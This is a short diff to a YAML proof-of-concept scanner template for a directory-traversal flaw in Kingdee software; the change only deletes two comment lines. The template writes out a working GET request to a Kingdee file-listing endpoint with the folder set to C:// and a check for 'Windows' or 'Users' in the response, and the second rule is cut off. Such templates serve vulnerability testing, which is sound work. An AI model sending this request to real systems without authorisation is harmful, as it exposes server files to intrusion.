@@ -2,14 +2,12 @@ name: poc-yaml-kingdee-directory-traversal
 manual: true
 transport: http
 rules:
-#win
   kingdee1:
     request:
       cache: true
       method: GET
       path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
     expression: response.status == 200 && response.body.bcontains(b"Windows") || response.body.bcontains(b"Users")
-#linux
   kingdee2:
     request:
       cache: true
